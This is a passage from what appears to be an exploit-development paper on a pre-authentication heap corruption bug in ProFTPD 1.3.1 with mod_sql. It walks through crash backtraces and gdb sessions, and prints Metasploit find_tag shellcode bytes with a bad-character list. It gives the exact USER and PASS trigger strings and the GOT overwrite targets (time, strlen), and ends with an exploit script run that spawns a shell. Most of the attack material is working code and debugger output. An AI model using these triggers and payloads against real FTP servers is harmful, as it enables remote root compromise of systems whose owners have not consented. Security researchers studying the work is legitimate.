+EIP: 0x0804c651, EBP: 0xbfd0a5a8, _dispatch
+EIP: 0x0804caba, EBP: 0xbfd0a5d8, pr_cmd_dispatch
+EIP: 0x0804d4ee, EBP: 0xbfd0aa48, cmd_loop
+EIP: 0x0804ea36, EBP: 0xbfd0ab88, fork_server
+EIP: 0x0804f1cf, EBP: 0xbfd0acf8, daemon_loop
+EIP: 0x080522c6, EBP: 0xbfd0ad28, standalone_main
+EIP: 0x08053109, EBP: 0xbfd0aea8, main
+EIP: 0xb7b1c685, EBP: 0xbfd0af18, __libc_start_main
+EIP: 0x0804b841, EBP: 0x00000000, _start
+# cat regs.99758.0
+EAX: 0x62413362
+EBX: 0x0882d4ac
+ECX: 0x00000002
+EDX: 0x088356c8
+ESI: 0x080d4960
+EDI: 0x088161e8
+EBP: 0xbfd0a338
+ESP: 0xbfd0a330
+EIP: 0x08054b7d
+
+Unfortunately, EIP is the same as the 2813d637d735be610a460a75db061f6b
+backtrace, except it dies with pr_auth_getgroups in the backtrace, rather 
+than pr_auth_getpwnam.
+
+------[ 3.3.4 - 844319188798d7742af43d10f6541a61 backtrace ]
+
+# cat bt_frames.103331.0
+EIP: 0x08054b7d, EBP: 0xbfd0a368, destroy_pool
+EIP: 0x08054b0c, EBP: 0xbfd0a378, clear_pool
+EIP: 0x08054bd1, EBP: 0xbfd0a388, destroy_pool
+EIP: 0x08074a37, EBP: 0xbfd0a438, pr_auth_getgroups
+EIP: 0x08074a98, EBP: 0xbfd0a468, auth_anonymous_group
+EIP: 0x08074ea7, EBP: 0xbfd0a4a8, pr_auth_get_anon_config
+EIP: 0x080c5691, EBP: 0xbfd0a4d8, sql_pre_pass
+EIP: 0x080718a6, EBP: 0xbfd0a4f8, call_module
+EIP: 0x0804c651, EBP: 0xbfd0a5a8, _dispatch
+EIP: 0x0804c9bb, EBP: 0xbfd0a5d8, pr_cmd_dispatch
+EIP: 0x0804d4ee, EBP: 0xbfd0aa48, cmd_loop
+EIP: 0x0804ea36, EBP: 0xbfd0ab88, fork_server
+EIP: 0x0804f1cf, EBP: 0xbfd0acf8, daemon_loop
+EIP: 0x080522c6, EBP: 0xbfd0ad28, standalone_main
+EIP: 0x08053109, EBP: 0xbfd0aea8, main
+EIP: 0xb7b1c685, EBP: 0xbfd0af18, __libc_start_main
+EIP: 0x0804b841, EBP: 0x00000000, _start
+# cat regs.103331.0
+EAX: 0x62413362
+EBX: 0x0000a2f3
+ECX: 0x00000002
+EDX: 0x0882f2b8
+ESI: 0x080d4960
+EDI: 0x088161e8
+EBP: 0xbfd0a368
+ESP: 0xbfd0a360
+EIP: 0x08054b7d
+
+Not that interesting, unfortunately. 
+
+------[ 3.3.5 - 914b175392625fe75c2b16dc18bfb250 backtrace ]
+
+# cat bt_frames.98014.0
+EIP: 0x080544e0, EBP: 0xbfd0a368, free_blocks
+EIP: 0x08054b30, EBP: 0xbfd0a378, clear_pool
+EIP: 0x08054bd1, EBP: 0xbfd0a388, destroy_pool
+EIP: 0x08074a37, EBP: 0xbfd0a438, pr_auth_getgroups
+EIP: 0x08074a98, EBP: 0xbfd0a468, auth_anonymous_group
+EIP: 0x08074ea7, EBP: 0xbfd0a4a8, pr_auth_get_anon_config
+EIP: 0x080c5691, EBP: 0xbfd0a4d8, sql_pre_pass
+EIP: 0x080718a6, EBP: 0xbfd0a4f8, call_module
+EIP: 0x0804c651, EBP: 0xbfd0a5a8, _dispatch
+EIP: 0x0804c9bb, EBP: 0xbfd0a5d8, pr_cmd_dispatch
+EIP: 0x0804d4ee, EBP: 0xbfd0aa48, cmd_loop
+EIP: 0x0804ea36, EBP: 0xbfd0ab88, fork_server
+EIP: 0x0804f1cf, EBP: 0xbfd0acf8, daemon_loop
+EIP: 0x080522c6, EBP: 0xbfd0ad28, standalone_main
+EIP: 0x08053109, EBP: 0xbfd0aea8, main
+EIP: 0xb7b1c685, EBP: 0xbfd0af18, __libc_start_main
+EIP: 0x0804b841, EBP: 0x00000000, _start
+# cat regs.98014.0
+EAX: 0x33614132
+EBX: 0x00009bd9
+ECX: 0x00000002
+EDX: 0x0882ea84
+ESI: 0x080d4960
+EDI: 0x088161e8
+EBP: 0xbfd0a368
+ESP: 0xbfd0a350
+EIP: 0x080544e0
+
+EAX contains a corrupted value.
+
+Looking at it further:
+
+This GDB was configured as "i486-linux-gnu"...
+(gdb) l *0x080544e0
+0x80544e0 is in free_blocks (pool.c:138).
+133
+134       block_freelist = blok;
+135
+136       /* Adjust first_avail pointers */
+137
+138       while (blok->h.next) {
+139         chk_on_blk_list(blok, old_free_list);
+140         blok->h.first_avail = (char *) (blok + 1);
+141         blok = blok->h.next;
+142       }
+
+This is semi-interesting, as we can overwrite something to point to the end
+of the block (the start of the allocated usable memory). However, the 
+blok = blok->h.next loop makes things a lot more trickier than we'd like 
+(finding a suitable pointer that terminates the loop without crashing, 
+etc.)
+
+Moving on...
+
+------[ 3.3.6 - b975726b4537662f3f5ddf377ea26c20 backtrace ]
+
+# cat bt_frames.1575.0
+EIP: 0x080544e0, EBP: 0xbfd0a338, free_blocks
+EIP: 0x08054b30, EBP: 0xbfd0a348, clear_pool
+EIP: 0x08054bd1, EBP: 0xbfd0a358, destroy_pool
+EIP: 0x08074a37, EBP: 0xbfd0a408, pr_auth_getgroups
+EIP: 0x08074a98, EBP: 0xbfd0a438, auth_anonymous_group
+EIP: 0x08074ea7, EBP: 0xbfd0a478, pr_auth_get_anon_config
+EIP: 0x080a4b5c, EBP: 0xbfd0a4d8, auth_user
+EIP: 0x080718a6, EBP: 0xbfd0a4f8, call_module
+EIP: 0x0804c651, EBP: 0xbfd0a5a8, _dispatch
+EIP: 0x0804caba, EBP: 0xbfd0a5d8, pr_cmd_dispatch
+EIP: 0x0804d4ee, EBP: 0xbfd0aa48, cmd_loop
+EIP: 0x0804ea36, EBP: 0xbfd0ab88, fork_server
+EIP: 0x0804f1cf, EBP: 0xbfd0acf8, daemon_loop
+EIP: 0x080522c6, EBP: 0xbfd0ad28, standalone_main
+EIP: 0x08053109, EBP: 0xbfd0aea8, main
+EIP: 0xb7b1c685, EBP: 0xbfd0af18, __libc_start_main
+EIP: 0x0804b841, EBP: 0x00000000, _start
+# cat regs.1575.0
+EAX: 0x33614132
+EBX: 0x0882d29c
+ECX: 0x00000002
+EDX: 0x088398a4
+ESI: 0x080d4960
+EDI: 0x088161e8
+EBP: 0xbfd0a338
+ESP: 0xbfd0a320
+EIP: 0x080544e0
+
+This is a duplicate of the previous one..
+
+------[ 3.3.7 - ccbbd918ad0dbc7a869184dc2eb9cc50 backtrace ]
+
+# cat bt_frames.1081.0 
+EIP: 0x080544e0, EBP: 0xbfd0a318, free_blocks
+EIP: 0x08054b30, EBP: 0xbfd0a328, clear_pool
+EIP: 0x08054bd1, EBP: 0xbfd0a338, destroy_pool
+EIP: 0x08054b0c, EBP: 0xbfd0a348, clear_pool
+EIP: 0x08054bd1, EBP: 0xbfd0a358, destroy_pool
+EIP: 0x08074a37, EBP: 0xbfd0a408, pr_auth_getgroups
+EIP: 0x08074a98, EBP: 0xbfd0a438, auth_anonymous_group
+EIP: 0x08074ea7, EBP: 0xbfd0a478, pr_auth_get_anon_config
+EIP: 0x080a4b5c, EBP: 0xbfd0a4d8, auth_user
+EIP: 0x080718a6, EBP: 0xbfd0a4f8, call_module
+EIP: 0x0804c651, EBP: 0xbfd0a5a8, _dispatch
+EIP: 0x0804caba, EBP: 0xbfd0a5d8, pr_cmd_dispatch
+EIP: 0x0804d4ee, EBP: 0xbfd0aa48, cmd_loop
+EIP: 0x0804ea36, EBP: 0xbfd0ab88, fork_server
+EIP: 0x0804f1cf, EBP: 0xbfd0acf8, daemon_loop
+EIP: 0x080522c6, EBP: 0xbfd0ad28, standalone_main
+EIP: 0x08053109, EBP: 0xbfd0aea8, main
+EIP: 0xb7b1c685, EBP: 0xbfd0af18, __libc_start_main
+EIP: 0x0804b841, EBP: 0x00000000, _start
+# cat regs.1081.0
+EAX: 0x33614132
+EBX: 0x0882d29c
+ECX: 0x00000002
+EDX: 0x08839484
+ESI: 0x080d4960
+EDI: 0x088161e8
+EBP: 0xbfd0a318
+ESP: 0xbfd0a300
+EIP: 0x080544e0
+
+Another duplicate :(
+
+------[ 3.3.8 - f1bfd5428c97b9d68a4beb6fb8286b70 backtrace ] 
+
+# cat bt_frames.11512.0
+EIP: 0xb7b7e67a, EBP: 0xbfd0a118, memset
+EIP: 0x080c2520, EBP: 0xbfd0a148, _sql_make_cmd
+EIP: 0x080c4344, EBP: 0xbfd0a1f8, _sql_getpasswd
+EIP: 0x080c514d, EBP: 0xbfd0a2d8, _sql_getgroups
+EIP: 0x080ca70e, EBP: 0xbfd0a308, cmd_getgroups
+EIP: 0x080718a6, EBP: 0xbfd0a328, call_module
+EIP: 0x0807339e, EBP: 0xbfd0a358, dispatch_auth
+EIP: 0x0807481d, EBP: 0xbfd0a408, pr_auth_getgroups
+EIP: 0x08074a98, EBP: 0xbfd0a438, auth_anonymous_group
+EIP: 0x08074ea7, EBP: 0xbfd0a478, pr_auth_get_anon_config
+EIP: 0x080a4b5c, EBP: 0xbfd0a4d8, auth_user
+EIP: 0x080718a6, EBP: 0xbfd0a4f8, call_module
+EIP: 0x0804c651, EBP: 0xbfd0a5a8, _dispatch
+EIP: 0x0804caba, EBP: 0xbfd0a5d8, pr_cmd_dispatch
+EIP: 0x0804d4ee, EBP: 0xbfd0aa48, cmd_loop
+EIP: 0x0804ea36, EBP: 0xbfd0ab88, fork_server
+EIP: 0x0804f1cf, EBP: 0xbfd0acf8, daemon_loop
+EIP: 0x080522c6, EBP: 0xbfd0ad28, standalone_main
+EIP: 0x08053109, EBP: 0xbfd0aea8, main
+EIP: 0xb7b1c685, EBP: 0xbfd0af18, __libc_start_main
+EIP: 0x0804b841, EBP: 0x00000000, _start
+# cat regs.11512.0
+EAX: 0x00000000
+EBX: 0x0882da74
+ECX: 0x00000024
+EDX: 0x00000001
+ESI: 0x080d4960
+EDI: 0x41346141
+EBP: 0xbfd0a118
+ESP: 0xbfd0a0e8
+EIP: 0xb7b7e67a
+
+EDI is a pointer we control. Looking at it further:
+
+(gdb) l *0x080c2520
+0x80c2520 is in _sql_make_cmd (mod_sql.c:350).
+345       register unsigned int i = 0;
+346       pool *newpool = NULL;
+347       cmd_rec *cmd = NULL;
+348       va_list args;
+349
+350       newpool = make_sub_pool(p);
+351       cmd = pcalloc(newpool, sizeof(cmd_rec));
+352       cmd->argc = argc;
+353       cmd->stash_index = -1;
+354       cmd->pool = newpool;
+(gdb)
+355
+356       cmd->argv = pcalloc(newpool, sizeof(void *) * (argc + 1));
+357       cmd->tmp_pool = newpool;
+358       cmd->server = main_server;
+359
+360       va_start(args, argc);
+361
+362       for (i = 0; i < argc; i++)
+363         cmd->argv[i] = (void *) va_arg(args, char *);
+364
+(gdb)
+365       va_end(args);
+366
+367       cmd->argv[argc] = NULL;
+368
+369       return cmd;
+370     }
+371
+372     static int check_response(modret_t *mr) {
+373       if (!MODRET_ISERROR(mr))
+374         return 0;
+
+Interesting, it's in the make_sub_pool() code. Looking at it further:
+
+---
+310 struct pool *make_sub_pool(struct pool *p) {
+311   union block_hdr *blok;
+312   pool *new_pool;
+313
+314   pr_alarms_block();
+315
+316   blok = new_block(0, FALSE);
+317
+318   new_pool = (pool *) blok->h.first_avail;
+319   blok->h.first_avail += POOL_HDR_BYTES;
+320
+321   memset(new_pool, 0, sizeof(struct pool));
+322   new_pool->free_first_avail = blok->h.first_avail;
+323   new_pool->first = new_pool->last = blok;
+324
+325   if (p) {
+326     new_pool->parent = p;
+327     new_pool->sub_next = p->sub_pools;
+328
+329     if (new_pool->sub_next)
+330       new_pool->sub_next->sub_prev = new_pool;
+331
+332     p->sub_pools = new_pool;
+333   }
+334
+335   pr_alarms_unblock();
+336
+337   return new_pool;
+338 }
+---
+
+So, if we got it returning an arbitrary pointer, allocations from this
+pool (if within the default pool size) will overwrite memory we
+control.. let's see what could be (include/dirtree.h):
+
+---
+ 96 typedef struct cmd_struc {
+ 97   pool *pool;
+ 98   server_rec *server;
+ 99   config_rec *config;
+100   pool *tmp_pool;               /* Temporary pool which only exists
+101                                  * while the cmd's handler is running
+102                                  */
+103   int argc;
+104
+105   char *arg;                    /* entire argument (excluding 
+                                       command) */
+106   char **argv;
+107   char *group;                  /* Command grouping */
+108
+109   int  class;                   /* The command class */
+110   int  stash_index;             /* hack to speed up symbol hashing in 
+                                       modules.c */
+111   pr_table_t *notes;            /* Private data for passing/retaining 
+                                       between handlers */
+112 } cmd_rec;
+---
+
+Hmm, so we could overwrite pointers with somewhat controllable contents
+(don't forget the SELECT .. FROM .. WHERE type stuff interfering..)
+
+------[ 3.3.9 - Summary ]
+
+Out of the backtraces it has generated, the following look most useful (in 
+usefulness looking order :p):
+
+- 11380f2c8ce44d29b93b9bc6308692ae
+- f1bfd5428c97b9d68a4beb6fb8286b70
+- 914b175392625fe75c2b16dc18bfb250
+
+Considering the code path taken, the first is the most easily exploitable. 
+Unfortunately, we haven't got a clean EIP overwrite, and instead require 
+returning a suitable pointer that will trash stuff near by it... depending 
+on exploitation avenue, this may make things rather complicated. 
+
+--[ 3.4 - Exploitation avenues ]
+
+So far, we've found an approach that allows us to return a pointer to be
+used later on where data we control is used in conjunction with other data. 
+
+What can we do with that? There's a couple of possibilities:
+
+- Work out how to indicate authentication has succeeded
+  - Should leave us with the ftpd with nobody (revertable to root) 
+    privileges, and access to /. That'd be pretty neat ;D
+  - If we munge the heap too much, however, it may crash. Depending on 
+    what's being overwritten etc, it may be unavoidable.
+
+- Run our own shellcode 
+  - We can revert to root with a setresuid() call.
+  - More anti-forensically acceptable / less effort / etc :p
+
+------[ 3.4.1 - Shellcode approach ] 
+
+By returning a pointer that leads us to overwrite a function pointer with 
+our contents, we can run shellcode. All that's required is a single 
+address. Let's say for arguments say, we use 
+
+USER ...SHELLCODE%m%a..<POINTER TO RETURN><OVERWRITE CONTENT>
+
+We would overwrite the function pointer with a pointer to shellcode (our
+original pointer - X bytes to hit it). If we need to brute force a target 
+pointer to overwrite, we can probably repeat <OVERWRITE CONTENT> several 
+times to cover more memory than normal.
+
+Due to space considerations, it would be best to use a find sock / recv() 
+tag shellcode as a stager, then sending a another payload later on.
+
+If shellcode size is a problem, it would be possible to spray our shellcode
+across the heap in the fake auth attempt, and use an egg hunter code in the
+trigger auth attempt. Ideally we would have a register or stack contents to
+give us an idea of where to start in case of ASLR. 
+
+There are perhaps some other techniques that may be possible on certain
+configurations, such as inputting the shellcode via reverse DNS, or in the 
+ident lookup text. While possible, it's not entirely needed at this point 
+in time and wasn't explored further.
+
+Talking about shellcode, we should look at what character restrictions 
+have. Obviously, \x0d, \x0a, \x00 would be problematic since FTP is a text 
+line based protocol. Reading further over the contrib/mod_sql_mysql.c code,
+we see that we have several other restrictions, as documented in [8], which
+gives us the following bad characters:
+
+\x0d (\r), \x0a (\n), \x00, \x27 ('), \x22 ("), \x08 (\b), \x09 (\t)
+\x1b (\Z), \x5c (\\), \x5f (_), \x25 (%)
+
+(That is, assuming we are exploiting ProFTPD getting auth information from 
+MySQL. If it's getting information from Postgresql, then the bad character 
+restrictions are probably different).
+
+All in all, those restrictions aren't too bad, and some light 
+experimentation implies it should be fine to use, as the following pastes 
+show:
+
+---
+msf payload(shell_find_tag) >  generate -b
+"\x00\x27\x22\x08\x0a\x0d\x09\x1B\x5c\x5f" -t c -o PrependSetresuid=true
+/*
+ * linux/x86/shell_find_tag - 102 bytes
+ * http://www.metasploit.com
+ * Encoder: x86/fnstenv_mov
+ * AppendExit=false, PrependSetresuid=true, TAG=2pDv,
+ * PrependSetuid=false, PrependSetreuid=false
+ */
+unsigned char buf[] =
+"\x6a\x14\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x12\x87"
+"\xe9\xb7\x83\xeb\xfc\xe2\xf4\x23\x4e\xd8\x6c\xe5\x64\x59\x13"
+"\xdf\x07\xd8\x6c\x41\x0e\x0f\xdd\x52\x30\xe3\xe4\x44\xd4\x60"
+"\x56\x94\x7c\x8f\x48\x13\xed\x8f\xef\xdf\x07\x68\x89\x20\xf7"
+"\xad\xc1\x67\x77\xb6\x3e\xe9\xed\xeb\xee\x78\xb8\xb1\x7a\x92"
+"\xce\x90\x4f\x78\x8c\xb1\x2e\x40\xef\xc6\x98\x61\xef\x81\x98"
+"\x70\xee\x87\x3e\xf1\xd5\xba\x3e\xf3\x4a\x69\xb7";
+
+...
+
+msf payload(find_tag) > use payload/linux/x86/shell/find_tag
+msf payload(find_tag) > generate -b
+"\x00\x27\x22\x08\x0a\x0d\x09\x1B\x5c\x5f" -t c -o PrependSetresuid=true
+/*
+ * linux/x86/shell/find_tag - 74 bytes (stage 1)
+ * http://www.metasploit.com
+ * Encoder: x86/shikata_ga_nai
+ * AppendExit=false, PrependSetresuid=true, TAG=qvkV,
+ * PrependSetuid=false, PrependSetreuid=false
+ */
+unsigned char buf[] =
+"\x31\xc9\xbf\xd3\xde\x9e\x99\xdb\xc9\xd9\x74\x24\xf4\x5b\xb1"
+"\x0c\x83\xc3\x04\x31\x7b\x0f\x03\x7b\x0f\xe2\x26\xef\x57\xa8"
+"\x13\xe7\x8b\x7b\x07\xc5\xcc\x4d\x9c\x85\x45\x4b\x48\x6a\xe1"
+"\x9e\xdf\x3c\x5e\x16\x3e\x46\x9b\x4e\x3f\x46\x36\xe9\xe7\x84"
+"\x46\x74\x29\x66\x31\x1c\x03\xfd\x4d\xbd\x57\x50\x52\xa4";
+
+/*
+ * linux/x86/shell/find_tag - 36 bytes (stage 2)
+ * http://www.metasploit.com
+ */
+unsigned char buf[] =
+"\x89\xfb\x6a\x02\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x6a\x0b"
+"\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3"
+"\x52\x53\x89\xe1\xcd\x80";
+---
+
+We can note down that we require 74 bytes or so for the shellcode.
+
+If character encoding is enabled in ProFTPD (via mod_lang), this may incur 
+further restrictions in characters we can use, or alternatively require 
+decoding our payload, so that when it's encoded, it is correct. If 
+possible/suitable, that is :p
+
+If the pointers we are after contain a bad character, we're in a little bit
+of trouble :|
+
+------[ 3.4.2 - Data manipulation ]
+
+There are plenty of global variables that can be modified in ProFTPD, that 
+can/may be useful for data manipulation. 
+
+grep'ing the src/ directory for "authenticated" shows some interesting 
+code:
+
+---
+ 288 static void shutdown_exit(void *d1, void *d2, void *d3, void *d4) {
+ 289   if (check_shutmsg(&shut, &deny, &disc, shutmsg, sizeof(shutmsg)) == 
+          1) {
+ 290     char *user;
+ 291     time_t now;
+ 292     char *msg;
+ 293     const char *serveraddress;
+ 294     config_rec *c = NULL;
+ 295     unsigned char *authenticated = get_param_ptr(main_server->conf,
+ 296       "authenticated", FALSE);
+ 297
+...
+ 388       if (c->requires_auth && cmd_auth_chk && !cmd_auth_chk(cmd))
+ 389         return -1;
+ 390
+... (cmd_auth_chk being a .bss function pointer)
+ 393       cmdargstr = make_arg_str(cmd->tmp_pool, cmd->argc, cmd->argv);
+ 394
+ 395       if (cmd_type == CMD) {
+ 396
+ 397         /* The client has successfully authenticated... */
+ 398         if (session.user) {
+ 399           char *args = strchr(cmdargstr, ' ');
+ 400
+ 401           pr_scoreboard_entry_update(session.pid,
+ 402             PR_SCORE_CMD, "%s", cmd->argv[0], NULL, NULL);
+ 403           pr_scoreboard_entry_update(session.pid,
+ 404             PR_SCORE_CMD_ARG, "%s", args ?
+ 405               pr_fs_decode_path(cmd->tmp_pool, (args+1)) : "", NULL, 
+                                     NULL);
+ 406
+ 407           pr_proctitle_set("%s - %s: %s", session.user, 
+               session.proc_prefix,
+ 408             cmdargstr);
+ 409
+ 410         /* ...else the client has not yet authenticated */
+ 411         } else {
+ 412           pr_proctitle_set("%s:%d: %s", session.c->remote_addr ?
+ 413             pr_netaddr_get_ipstr(session.c->remote_addr) : "?",
+ 414             session.c->remote_port ? session.c->remote_port : 0, 
+                 cmdargstr);
+ 415         }
+ 416       }
+---
+
+in modules/mod_auth.c:
+
+---
+  59 /* auth_cmd_chk_cb() is hooked into the main server's auth_hook 
+        function,
+  60  * so that we can deny all commands until authentication is complete.
+  61  */
+  62 static int auth_cmd_chk_cb(cmd_rec *cmd) {
+  63   unsigned char *authenticated = get_param_ptr(cmd->server->conf,
+  64     "authenticated", FALSE);
+  65
+  66   if (!authenticated || *authenticated == FALSE) {
+  67     pr_response_send(R_530, _("Please login with USER and PASS"));
+  68     return FALSE;
+  69   }
+  70
+  71   return TRUE;
+  72 }
+  73
+---
+
+The authenticated configuration directive is set:
+
+---
+1846     c = add_config_param_set(&cmd->server->conf, "authenticated", 1, 
+                                  NULL);
+1847     c->argv[0] = pcalloc(c->pool, sizeof(unsigned char));
+1848     *((unsigned char *) c->argv[0]) = TRUE;
+---
+
+It seems a little complicated to call due to other code around it..  but
+it'd probably be possible to with a bit of effort and the stack wasn't
+randomized, or maybe some other approaches.  That said, the author isn't
+going to spend much time looking at it. One last thought on the matter:
+
+---
+ 192   /* By default, enable auth checking */
+ 193   set_auth_check(auth_cmd_chk_cb);
+---
+
+If authentication is bypassed, but setresuid() is not callable (via NX, or 
+whatever), then there is a slight restriction of the user id it has by 
+default:
+
+# cat /proc/19840/status
+Name:   proftpd
+State:  T (tracing stop)
+Tgid:   19840
+Pid:    19840
+PPid:   19830
+TracerPid:      19846
+Uid:    0       65534   0       65534
+Gid:    65534   65534   65534   65534
+FDSize: 32
+Groups: 65534
+...
+CapInh: 0000000000000000
+CapPrm: ffffffffffffffff
+CapEff: 0000000000000000
+CapBnd: ffffffffffffffff
+
+UID/GID list in real, effective, saved, fsuid format. Without reverting
+privileges, it limits what we can do. That said, it allows for a lot of
+information leaking if the directory permissions aren't too strict / acl's 
+aren't too strict.
+
+--[ 4 - Writing an exploit ] 
+
+Before writing an exploit, we should quickly review what we have found out 
+before:
+
+- Variable substitution allows us expand past the allocated 4096 bytes
+  - %m/%r duplicates our input
+  - %a gives us our IP address
+  - %f gives us -
+  - %T gives us 0.0
+  - %Z gives us {UNKNOWN TAG}
+  - %l gives us UNKNOWN if ident checking is disabled (default).. we'll use
+    it even though it's not ideal (ident could be enabled, and if the box 
+    where the exploit is ran from is running ident, it could affect the 
+    ProFTPD heap layout more.
+
+%a isn't all that good for a remote exploit, as the byte count can differ 
+(attacking from 1.2.3.4 vs 136.246.139.246. We'll try excluding that for 
+now, although it's useful for consuming small chunks :|
+
+In order to exploit this vulnerability, we can re-use some of our existing 
+code to find the input strings needed against new targets when we can 
+replicate a target environment.
+
+------[ 4.1 - Exploitation via arbitrary pointer return ] 
+
+So, let's see, what do we need to do?
+
+- Find a suitable trigger string that allows us, say:
+  - 16 byte overwrite (since our offset is 12 for first_avail pointer)
+  - 74 bytes of shellcode. Should be plenty of space, and enough to do 
+    interesting things with.
+
+- Find a suitable target. For the most part, the GOT seems a good
+  target, though this may be reassessed later on.
+  - Ideally you'd want to use a libc function that will be used next.
+    Due to the style of attack we're using, if it uses another libc 
+    function, we may overwrite it with crap (crap being stuff like table
+    entries / names / our expanded string) :(
+
+After some experimentation, I came up with the following input strings to 
+trigger the vulnerability with a suitable call tree:
+
+- USER %T%m%Z%m%T%l%m%f%l%m%lA%T%m%f%f%l%m%m%T%m%f%m%m%m%mA%m%f%f%l%m%TA%m%
+m%f%l%TA%fA%l%Z%fA%T%T%l%f%l%f%f%Z%l%m%Z%f%l%T%f%Z%fAAA%Z%l%m%fA%l%m%TA%ZA%
+f%lAA%f%m%Z%Z%Z%T%Z%f%m%Z%l%fA%Z
+- PASS invalid
+- USER AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAA%T%f%TA%Z%m%Z%mA%m%ZA%Z%l%mA%T%mA%T%m%f%ZA%m%f%m%Z%m%T%m%T%m%f%fA%ZA%
+m%T%m%m%Z%T%m%Z%lA%T%l%l%T%f%Z%m%f%f%T%f%Z%l%m%TA%mAa0Aa1Aa2Aa3Aa4A
+
+And we have a crash writing to 0x41346141 ;)
+
+With that info in hand, we can start writing the exploit.. let's find a 
+target to overwrite.. From glancing over the back traces, it looks like 
+mysql_real_query() is a suitable target.
+
+080e81a8 R_386_JUMP_SLOT   mysql_real_query
+
+Plugging that in, and we get:
+
+Program received signal SIGSEGV, Segmentation fault.
+[Switching to Thread 0xb7c7a6b0 (LWP 12830)]
+0x41414141 in ?? ()
+(gdb) bt
+#0  0x41414141 in ?? ()
+#1  0x080c0ea1 in cmd_select (cmd=0x98ae7ec) at mod_sql_mysql.c:838
+
+Well, that's good. Not entirely what I was expecting though. Looking at the
+backtrace, we see it's calling time(NULL), so let's see:
+
+080e8218 R_386_JUMP_SLOT   time
+
+4187    int sql_log(int level, const char *fmt, ...) {
+4188      char buf[PR_TUNABLE_BUFFER_SIZE] = {'\0'};
+4189      time_t timestamp = time(NULL);
+4190      struct tm *t = NULL;
+4191      va_list msg;
+
+So, it looks like time is a better target. Updating our exploit:
+
+Program received signal SIGSEGV, Segmentation fault.
+[Switching to Thread 0xb7c7a6b0 (LWP 12923)]
+0x72657375 in ?? ()
+(gdb)
+
+That looks better (>>> "72657375".decode('hex') -> 'resu')
+
+(gdb) x/s 0x080e8218
+0x80e8218 <_GLOBAL_OFFSET_TABLE_+548>:   "userid, passwd, uid, gid,
+homedir, shell FROM ftpuser WHERE (userid='", 'A' <repeats 74 times>,
+"0.0-0.0A{UNKNOWN TAG}", 'A' <repeats 36 times>...
+
+Looking further
+
+(gdb) call strlen(0x080e8218)
+$1 = 4155
+(gdb) x/s 0x080e8218+4155-128
+0x80e91d3 <scoreboard_file+2963>:
+"%Z%m%Z%mA%m%ZA%Z%l%mA%T%mA%T%m%f%ZA%m%f%m%Z%m%T%m%T%m%f%fA%ZA%m%T%m%m%Z%T%
+m%Z%lA%T%l%l%T%f%Z%m%f%f%T%f%Z%l%m%TA%mAa0Aa1Aa2Aa3\030\202\016"
+(gdb) x/40x 0x080e8218+4155-64
+0x80e9213 <[...]_file+3027>: 0x256d2554 0x255a256d 0x256d2554 0x416c255a
+0x80e9223 <[...]_file+3043>: 0x6c255425 0x54256c25 0x5a256625 0x66256d25
+0x80e9233 <[...]_file+3059>: 0x54256625 0x5a256625 0x6d256c25 0x25415425
+0x80e9243 <[...]_file+3075>: 0x3061416d 0x41316141 0x61413261 0x0e821833
+
+Playing around further, we see that strlen() is called before that, so 
+further experimentation reveals we want to overwrite:
+
+080e819c R_386_JUMP_SLOT   strlen
+
+(Code for this can be found in [9])
+
+And our offset is 0x080e819c-358..
+
+Program received signal SIGSEGV, Segmentation fault.
+[Switching to Thread 0xb7c7a6b0 (LWP 13357)]
+0x41306141 in ?? ()
+
+So, we've made it jump to another pattern in msf.. which we can replace 
+with a pointer to our shellcode.. which will be:
+
+(gdb) x/s 0x080e819c
+0x80e819c <_GLOBAL_OFFSET_TABLE_+424>:
+"Aa0Aa1Aa2Aa36\200\016\b{UNKNOWN TAG}", 'A' <repeats 74 times>,
+"%T%f%TA%Z%m%Z%mA%m%ZA%Z%l%mA%T%mA%T%m%f%ZA%m%f%m%Z%m%T%m%T%m%f%fA%ZA%m%T%m
+%m%Z%T%m%Z%lA%T%l%l%T%f"...
+(gdb) x/s 0x080e819c+29
+0x80e81b9 <_GLOBAL_OFFSET_TABLE_+453>:   'A' <repeats 74 times>,
+"%T%f%TA%Z%m%Z%mA%m%ZA%Z%l%mA%T%mA%T%m%f%ZA%m%f%m%Z%m%T%m%T%m%f%fA%ZA%m%T%m
+%m%Z%T%m%Z%lA%T%l%l%T%f%Z%m%f%f%T%f%Z%l%m%TA%mAa0Aa1"...
+
+To hit our A's.
+
+We can now use a suitable stager findsock/execve shell... We'll use the one
+we found earlier with metasploit. Verifying that we can hit our shellcode, 
+we see:
+
+Program received signal SIGTRAP, Trace/breakpoint trap.
+[Switching to Thread 0xb7c7a6b0 (LWP 13476)]
+0x080e81ba in _GLOBAL_OFFSET_TABLE_ ()
+
+So, now we get to validate the shellcode works as expected (code can be 
+found in [10])
+
+Program received signal SIGSEGV, Segmentation fault.
+[Switching to Thread 0xb7b666b0 (LWP 13648)]
+0xbf86cad0 in ?? ()
+(gdb) x/10i $eip
+0xbf86cad0:     mov    %edi,%ebx
+0xbf86cad2:     push   $0x2
+0xbf86cad4:     pop    %ecx
+0xbf86cad5:     push   $0x3f
+0xbf86cad7:     pop    %eax
+0xbf86cad8:     int    $0x80
+0xbf86cada:     dec    %ecx
+0xbf86cadb:     jns    0xbf86cad5
+0xbf86cadd:     push   $0xb
+0xbf86cadf:     pop    %eax
+
+Whoops. Not so much. The stager code works by reading from the socket to 
+the stack, and jumping to the stack once complete. It seems that the kernel
+I'm using doesn't make the stack executable even if you setarch/personality
+it. 
+
+We could work around that short coming in metasploit by changing our 
+shellcode to read() into a different buffer, or mmap() some suitable 
+memory, or one of a hundred things. For now though, I'll cheat and install 
+the generic kernel, and try to finish off this paper :)
+
+Installing the ubuntu -generic kernel, we see (in gdb):
+
+---
+[New process 4936]
+Executing new program: /bin/dash
+(no debugging symbols found)
+warning: Cannot initialize thread debugging library: generic error
+warning: Cannot initialize thread debugging library: generic error
+(no debugging symbols found)
+[New process 4936]
+(no debugging symbols found)
+---
+# python exploitsc.py 127.0.0.1
+Banner is [220 ProFTPD 1.3.1 Server (ProFTPD Default Installation) 
+[127.0.0.1]]
+331 Password required for %T%m%Z%m%T%l%m%f%l%m%lA%T%m%f%f%l%m%m%T%m%f%m%m%m
